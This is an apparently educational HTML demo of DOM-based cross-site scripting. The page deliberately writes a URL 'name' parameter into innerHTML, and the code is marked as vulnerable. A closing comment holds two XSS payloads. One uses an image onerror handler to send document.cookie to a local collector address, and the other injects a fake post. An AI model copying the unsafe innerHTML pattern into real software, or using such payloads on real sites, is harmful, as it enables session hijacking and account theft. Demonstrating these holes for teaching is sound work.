<!DOCTYPE html>

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE-edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Example 1: Security - XSS</title>
</head>

<body>
    <div>
        Welcome, <span id="username"> </span>
        <!--Vulnerable Code -->

        <script>
            function setCookie(name, value, days) {
                const date = new Date()
                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000))
                const expires = "expires=" + date.toUTCString()
                document.cookie = name + "=" + value + ";" + expires + ";path=/"
            }
            setCookie("exampleCookie", "Hello, Cookie!", 7)
        </script>
        <script>
            const params = new URLSearchParams(window.location.search);
            const name = params.get("name");
            document.getElementById("username").innerHTML = `${name}`;
        </script>
    </div>
</body>

</html>

<!-- 
'?name=<img src=\"does-not-exist\" onerror=\"var img=document.createElement(\'img\'); img.src=`http://127.0.0.1:5500/cookie?data=+${document.cookie}`; document.querySelector(\'body\').appendChild(img);">
 
name=<img src=\"error.gif"\ onerror=\"createPost=('hacker_title', 'hacker_desc');"\>

-->